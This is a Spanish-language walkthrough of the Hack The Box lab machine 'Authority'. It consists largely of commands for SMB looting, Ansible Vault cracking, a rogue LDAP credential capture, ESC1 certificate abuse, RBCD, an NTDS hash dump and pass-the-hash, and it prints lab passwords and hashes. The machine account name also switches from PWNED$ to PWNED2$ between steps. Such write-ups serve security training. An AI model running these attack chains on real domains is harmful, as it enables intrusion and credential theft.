# Máquina: Authority

- **Sistema Operativo:** Windows
- **Dificultad:** Media
- **Técnicas clave:** SMB Enumeration, Ansible Vault Decryption, PWM Rogue LDAP Bind, AD CS (ESC1), PassTheCert, RBCD, NTDS Dump, Pass-the-Hash

---

![Authority](assets/Pasted%20image%2020260923222812.png)

## Fase 1: Reconocimiento y Enumeración

Iniciamos con un escaneo exhaustivo de puertos utilizando Nmap:

```bash
sudo nmap -sVC --min-rate 5000 -n -Pn -sS 10.129.229.56 -oN escaneo
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-24 02:29:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2026-09-24T02:30:02+00:00; +4h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp open  ssl/http      Apache Tomcat (language: en)
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
```

El servicio web principal en el puerto 80 no muestra contenido de interés:

![Sitio Web IIS](assets/Pasted%20image%2020260923223133.png)

Añadimos los nombres de dominio descubiertos en `/etc/hosts`:

![Configuración /etc/hosts](assets/Pasted%20image%2020260923223323.png)

### Enumeración SMB

Listamos los recursos compartidos por SMB utilizando la cuenta de invitado con NetExec (`nxc`):

```bash
nxc smb 10.129.229.56 -u 'guest' -p '' --shares
```

![Shares SMB](assets/Pasted%20image%2020260923223552.png)

El share `Development` permite lectura anónima. Nos conectamos mediante `smbclient`:

```bash
smbclient //10.129.229.56/Development -N
```

![Conexión smbclient](assets/Pasted%20image%2020260923224125.png)

Descargamos todos los archivos del recurso compartido de forma recursiva:

```bash
smbclient //10.129.229.56/Development -N -c 'prompt OFF; recurse ON; mget *'
```

Buscamos palabras clave sensibles como contraseñas en los archivos descargados:

```bash
grep -riE 'password|pwd|secret|pass:' --include='*.yml' --include='*.j2' -n .
```

![Grep credenciales](assets/Pasted%20image%2020260923225428.png)

Inspeccionamos el archivo `./PWM/defaults/main.yml`:

```bash
cat ./PWM/defaults/main.yml
```

![Contenido main.yml](assets/Pasted%20image%2020260923225541.png)

Observamos bloques cifrados con **Ansible Vault** (`$ANSIBLE_VAULT;1.1;AES256`).

![Ansible Vault Block](assets/Pasted%20image%2020260923225928.png)

Extraemos el hash del vault utilizando `ansible2john`:

```bash
ansible2john vault.txt > vault.hash
```

![ansible2john](assets/Pasted%20image%2020260923230026.png)

Crackeamos el hash con John the Ripper:

![John the Ripper](assets/Pasted%20image%2020260923231016.png)

La contraseña de descifrado del vault es: `!@#$%^&*`.

Guardamos la contraseña en `vaultpass.txt`:

```bash
echo -n '!@#$%^&*' > vaultpass.txt
```

Desciframos los bloques de `main.yml`:

```bash
ansible-vault decrypt vault.txt --vault-password-file vaultpass.txt --output -
```

![Descifrado ldap_admin_password](assets/Pasted%20image%2020260923231432.png)

Extraemos y desciframos los bloques restantes correspondientes a `pwm_admin_login` y `pwm_admin_password`:

```bash
awk '/pwm_admin_login: !vault/{flag=1; next} flag && /^[a-z_]+:/{flag=0} flag' main.yml | sed 's/^[[:space:]]*//' > vault_login.txt
ansible-vault decrypt vault_login.txt --vault-password-file vaultpass.txt --output -

awk '/pwm_admin_password: !vault/{flag=1; next} flag && /^[a-z_]+:/{flag=0} flag' main.yml | sed 's/^[[:space:]]*//' > vault_pwmpass.txt
ansible-vault decrypt vault_pwmpass.txt --vault-password-file vaultpass.txt --output -
```

![Descifrado PWM Credentials](assets/Pasted%20image%2020260923232406.png)

Obtenemos las credenciales:
- **Usuario:** `svc_pwm`
- **Contraseña:** `pWm_@dm!N_!23`

## Acceso Inicial vía PWM Rogue LDAP (User)

Estas credenciales no son válidas para acceso interactivo directo en Windows. Sin embargo, en el puerto 8443 corre Apache Tomcat con la aplicación **PWM Password Self Service**:

![Puerto 8443 Tomcat](assets/Pasted%20image%2020260923235233.png)

Accedemos a la interfaz web de PWM:

![Interfaz PWM](assets/Pasted%20image%2020260923235443.png)

Ingresamos al **Configuration Editor** con la contraseña administrativa `pWm_@dm!N_!23`:

![Configuration Editor](assets/Pasted%20image%2020260924000850.png)

En la sección de configuración de LDAP observamos la cuenta de servicio `svc_ldap`:

![Configuración LDAP PWM](assets/Pasted%20image%2020260924001412.png)

La contraseña está ofuscada en la interfaz. Para recuperarla, realizamos un ataque de **Rogue LDAP Server**: modificamos la URL del servidor LDAP en PWM para que apunte a nuestra IP atacante por LDAP plano (puerto 389):

![Modificación LDAP URL](assets/Pasted%20image%2020260924005826.png)

Iniciamos un listener con Netcat en el puerto 389 de nuestra máquina:

```bash
sudo nc -lvnp 389
```

Pulsamos en "Test LDAP Connection" en PWM y capturamos las credenciales en texto plano:

![Captura Bind LDAP](assets/Pasted%20image%2020260924005944.png)

La contraseña del usuario `svc_ldap` es: `lDaP_1n_th3_cle4r!`.

Nos conectamos mediante `evil-winrm`:

```bash
evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

![Evil-WinRM User](assets/Pasted%20image%2020260924010143.png)

Capturamos la flag de usuario (`user.txt`):

```text
3319a3c7fffd3ef761ee1dbd047790bc
```

## Escalada de Privilegios: AD CS (ESC1) + RBCD + NTDS Dump

Enumeramos Active Directory Certificate Services (AD CS) con **Certipy**:

```bash
certipy find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable
```

![Certipy Find](assets/Pasted%20image%2020260924011322.png)

Analizamos el reporte generado por Certipy y detectamos una vulnerabilidad **ESC1**:

![ESC1 en Certipy](assets/Pasted%20image%2020260924011538.png)

Revisamos los datos de la CA y de la plantilla vulnerable:
- **Plantilla:** `CorpVPN` (`ENROLLEE_SUPPLIES_SUBJECT` habilitado y `Client Authentication`).
- **CA:** `AUTHORITY-CA`.

![Autoridad AUTHORITY-CA](assets/Pasted%20image%2020260924011932.png)

Creamos una cuenta de máquina en el dominio (`PWNED$`) utilizando `addcomputer.py`:

```bash
addcomputer.py -computer-name 'PWNED$' -computer-pass 'Passw0rd123!' -dc-ip 10.129.229.56 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
```

Solicitamos un certificado suplantando a `Administrator` mediante ESC1:

![Petición de Certificado ESC1](assets/Pasted%20image%2020260924012153.png)

Al intentar autenticar con Certipy mediante Kerberos (`certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56`), el controlador de dominio rechaza la petición debido a que no soporta PKINIT.

Para explotar el certificado sin PKINIT, utilizamos **[PassTheCert](https://github.com/AlmondOffSec/PassTheCert)** mediante autenticación TLS Schannel contra LDAP (puerto 636) y configuramos **Resource-Based Constrained Delegation (RBCD)**.

### Paso 1: Extraer .crt y .key del archivo .pfx

```bash
openssl pkcs12 -in administrator.pfx -nocerts -out administrator.key
# PEM pass phrase: 1234

openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.crt
```

### Paso 2: Configurar RBCD mediante PassTheCert

Clonamos PassTheCert:

```bash
git clone https://github.com/AlmondOffSec/PassTheCert.git
cd PassTheCert
cp ../administrator.crt ../administrator.key .
```

Escribimos la delegación RBCD autenticándonos con el certificado de Administrator para que la cuenta de máquina (`PWNED2$`) pueda impersonar usuarios sobre el DC (`AUTHORITY$`):

```bash
python3 ./Python/passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'PWNED2$'
```

### Paso 3: S4U2Proxy e Impersonación de Administrator

Sincronizamos la hora con el controlador de dominio para evitar errores de reloj en Kerberos:

```bash
sudo timedatectl set-ntp false
sudo ntpdate 10.129.229.56
```

Solicitamos un ticket de servicio (TGS) impersonando a `Administrator` vía S4U2Proxy con `getST.py`:

```bash
getST.py -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/PWNED2$:Passw0rd123!'
```

### Paso 4: Dumpear NTDS.dit con Secretsdump

Establecemos la variable de entorno del ticket Kerberos y volcamos los hashes del dominio mediante DRSUAPI:

```bash
export KRB5CCNAME=Administrator@cifs_AUTHORITY.authority.htb@AUTHORITY.HTB.ccache
secretsdump.py -k -no-pass authority.htb/Administrator@authority.authority.htb -just-dc-ntlm
```

![Secretsdump NTDS](assets/Pasted%20image%2020260924055200.png)

Obtenemos el hash NTLM del usuario `Administrator`:
`6961f422924da90a6928197429eea4ed`

### Paso 5: Pass-the-Hash y Flag de Root

Nos conectamos mediante `evil-winrm` realizando Pass-the-Hash:

```bash
evil-winrm -i 10.129.229.56 -u Administrator -H '6961f422924da90a6928197429eea4ed'
```

![Root Obtenido](assets/Pasted%20image%2020260924055234.png)

Obtenemos acceso administrativo total sobre el Domain Controller.
